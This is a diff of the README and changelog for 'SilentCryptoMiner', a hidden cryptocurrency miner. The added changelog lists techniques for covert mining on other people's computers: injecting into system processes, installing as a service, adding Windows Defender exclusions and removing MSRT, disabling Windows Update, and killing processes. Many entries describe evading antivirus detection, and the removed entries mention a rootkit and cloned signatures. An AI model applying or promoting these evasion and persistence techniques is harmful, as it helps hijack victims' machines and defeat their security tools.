@@ -1,6 +1,6 @@
 <img src="https://github.com/UnamSanctam/SilentCryptoMiner/blob/master/SilentCryptoMiner.png?raw=true">
 
-# SilentCryptoMiner v3.3.1 - Miner for ETC, RVN, XMR, RTM & many more
+# SilentCryptoMiner v3.4.0 - Miner for ETC, RVN, XMR, RTM & many more
 
 A free silent (hidden) native cryptocurrency miner capable of mining ETC, RVN, XMR, RTM and much more, with many features suited for mining silently.
 
@@ -9,17 +9,16 @@ This miner can mine all the following algorithms and thus any cryptocurrency tha
  <summary>List of algorithms</summary>
  <table>
 	<tr><th>Algorithm</th><th>Example Cryptocurrency</th></tr>
-	<tr><td>rx/0</td><td>Monero</td></tr>
+	<tr><td>rx/0</td><td>Monero, Zephyr</td></tr>
 	<tr><td>gr</td><td>Raptoreum</td></tr>
-	<tr><td>ethash</td><td>EthereumPoW, Metaverse, Callisto, QuarkChain, EtherGem, Etho, Expanse, Ellaism</td></tr>
+	<tr><td>ethash</td><td>Callisto, Dubaicoin, Ellaism, Etho, EthereumPoW, Expanse, Nilu, Pirl, PowBlocks</td></tr>
 	<tr><td>etchash</td><td>Ethereum Classic</td></tr>
 	<tr><td>ubqhash</td><td>Ubiq</td></tr>
-	<tr><td>kawpow</td><td>Ravencoin, Neoxa, Meowcoin</td></tr>
+	<tr><td>kawpow</td><td>Ravencoin, Neoxa, Meowcoin, Neurai, Paprikacoin, Clore</td></tr>
 	<tr><td>firopow</td><td>Firo, Kiirocoin</td></tr>
 	<tr><td>progpow</td><td>Sero</td></tr>
 	<tr><td>progpowz</td><td>Zano</td></tr>
 	<tr><td>evrprogpow</td><td>Evrmore</td></tr>
-	<tr><td>cn/gpu</td><td>Conceal, Ryo, Equilibria</td></tr>
 	<tr><td>argon2/chukwa</td><td>2ACoin</td></tr>
 	<tr><td>rx/arq</td><td>ArQmA</td></tr>
 	<tr><td>cn-heavy/xhv</td><td>Haven, Blockcloud</td></tr>
@@ -53,7 +52,7 @@ This miner can mine all the following algorithms and thus any cryptocurrency tha
 ## Main Features
 
 * Native C++ - Miner installer/injector and watchdog coded fully in C++ with no run requirements except a 64-bit OS
-* Injection (Silent/Hidden) - Hide miner inside another process like explorer.exe, conhost.exe, svchost.exe and others
+* Injection (Silent/Hidden) - Hide miner inside another process like conhost.exe, explorer.exe, svchost.exe and others
 * Idle Mining - Can be configured to mine at different CPU and GPU usages or not at all while computer is or isn't in use
 * Stealth - Pauses the miner and clears the GPU memory and RAM while any of the programs in the "Stealth Targets" option are open
 * Watchdog - Monitors the miner file, miner processes and startup entry and restores the miner if anything is removed or killed
@@ -63,7 +62,6 @@ This miner can mine all the following algorithms and thus any cryptocurrency tha
 * Process Killer - Constantly checks for any programs in the "Kill Targets" list and kills them if found
 * Remote Configuration - Can get the miner settings remotely from a specified URL every 100 minutes
 * Web Panel Support - Has support for monitoring and configuring all the miners efficiently in a free self-hosted online web panel
-* Rootkit - Has a built-in rootkit that can be enabled to fully hide the miner processes
 * And many many more.
 
 ## Downloads
@@ -82,6 +80,42 @@ You can find the web panel that the miner officially supports here: [UnamWebPane
 
 ## Changelog
 
+### 3.4.0 (14-11-2023)
+* Changed administrator "Startup" installation procedure from using the Task Scheduler to instead install as a Service
+* Changed the Administrator "Startup" installation from installing into "Program Files" to instead install into "ProgramData"
+* Removed the "Run as System" option due to Services always running as System
+* Added MSRT removal to the "Add Defender Exclusions" feature
+* Changed the C++ compiler to one with less detections and better features
+* Improved external compiler starting procedure to bypass compiler bugs when the build path contains spaces or unicode characters
+* Modified the compilation process to incorporate "strip" for the removal of all unnecessary symbols and relocation data
+* Adjusted compiler optimization level to mitigate some antivirus detections
+* Enabled LTO during compilation to remove a lot of compiler caused detections from unused sections
+* Changed the compiler from using temporary files to instead use pipes in order to work better with some irregular environments
+* Changed the compilation procedure to add a randomized creation date and last write date to the built miner files
+* Reverted miner builder .NET Framework version back to .NET 4.5 from .NET 4.8 for better compatibility
+* Changed the miner injection technique to both reduce complexity and antivirus detections
+* Optimized the process creation code
+* Remade miner injection loop code and watchdog mutex check loop code to bypass a new targeted Windows Defender detection
+* Greatly improved the SysWhispersU syscall generator
+* Switched over from static syscalls to randomized dynamic syscalls
+* Changed the "Run as Administrator" feature to elevate programmatically instead of through a manifest file to avoid manifest caused detections
+* Added obfuscation to all constants and literals
+* Added base64 encoding to embedded files in order to bypass detections caused by high entropy data
+* Changed the embedded resource format from hex to decimal in order to reduce memory usage and time during compilation
+* Changed the default "Startup" tabs "Entry Name" and "File Name" to a randomized string due to Windows Defender targeting the current default names
+* Added new "Randomize" button next to the "Startup" tabs "Entry Name" and "File Name" options to allow for fast randomization
+* Added new "Advanced Option" that allows automatic UPX packing of the embedded miner resource files
+* Changed the "Disable Windows Update" and "Disable Sleep" functions to directly call the programs instead of calling them through a command line
+* Changed default "Inject Into" program to conhost.exe instead of explorer.exe due to explorer.exe now triggering detections when running under System
+* Added ".exe" extension exclusion to "Add Defender Exclusions" feature in order to potentially prevent some future general memory detections
+* Removed XMR "GPU Mining" option due to problems with CUDA and it being worse than the already existing dedicated GPU miner
+* Removed XMR "CPU Mining" option due to it having no reason to exist now that the "GPU Mining" option is gone
+* Rewrote XOR cipher function to bypass XOR obfuscation detection
+* Remade the "Block Websites" feature code to bypass some detections caused by looping
+* Greatly improved the overall code to reduce wasteful calls, handles and possible code signatures
+* Changed "Start Delay" to only apply before installation in order to avoid timeouts
+* Updated the uninstaller to properly remove all files
+* Updated the miners
 ### 3.3.1 (04/09/2023)
 * Added OpenCL ICD loader statically into the GPU miner because some systems local loaders do not seem to work
 * Added automatic CPU mining core restart when a prolonged period of zero hashrate is detected
@@ -125,39 +159,6 @@ You can find the web panel that the miner officially supports here: [UnamWebPane
 * Restructured the algorithm selection list to be easier to use
 * Added semi-CLI functionality for building miners through the command line
 * Updated the rootkit to a new version
-### 3.2.0 (01/04/2023)
-* Changed miner settings from being passed through the command line to instead be passed directly through the PEB
-* Changed XMR miner to clear RAM during "Stealth" when possible
-* Changed PEB calls to be more obfuscated due to new detections
-* Changed miner to read the current executable path for installation directly from the PEB instead of a Windows API call
-* Changed miner and watchdog to read the environmental variables directly by traversing the PEB
-* Included rootkit directly inside the miner instead of using the rootkit installer to avoid the new AMSI detections and for more flexibility
-* Changed rootkit to now run outside of the "Startup" installation flow to allow for it to run when "Startup" is disabled
-* Moved "Install Rootkit" out from "Advanced Options" and renamed it to "Use Rootkit (Hide Miner)" since the rootkit should now be stable
-* Updated compiler command options to reduce detections
-* Added system call registry access functions to allow registry manipulation without using the Windows API or CMD
-* Changed GPU checking to directly read the registry instead of using a WMI command with a file buffer
-* Added signature cloning tab where you can clone the digital certificate of another program into the miner
-* Moved administrator checks from powershell directly into the C++ code
-* Added Task Scheduler "Startup" entry checking into the Watchdog
-* Merged obfuscate.h library and obfuscatew.h library into a custom-made unified version called obfuscateu.h
-* Added a custom-made SysWhispersU direct system call generator and removed the previous SysWhispers2
-* Modified SysWhispersU and obfuscateu.h to use different encryptions in order to avoid XOR detections
-* Added simple obfuscation to well-known SysWhispers constants and offsets to avoid static detections
-* Readded explorer.exe as injection option
-* Made explorer.exe the default injection option again
-* Updated uninstaller to instead find the watchdog and miner processes by enumerating system mutex handles to find the owner process
-* Added "Disable Windows Update" rollback into the uninstaller to allow the uninstaller to fix Windows Update during uninstallation
-* Updated checker to instead check if the mutex is active to ascertain whether the miner and watchdog is running or not
-* Merged many C++ files together to be able to store them unzipped in the project in order to make all code changes directly visible in commits
-* Optimized and shortened many functions such as the previously verbose process creation function
-* Increased delete pending injection temporary file name length to further decrease collision chance
-* Fixed possible parent spoofing failure if required buffer size changes between system calls
-* Change installation to call reg.exe and schtasks.exe directly when possible instead of through cmd.exe
-* Fixed "Startup" installation bug on some systems when "Entry Name" contained a space
-* Fixed support for Unicode characters inside the "Assembly" settings
-* Updated both miners
-* Added Portuguese (Brazil) translation (MatheusOliveira-dev)
 
 [You can view the full Changelog here](CHANGELOG.md)
 
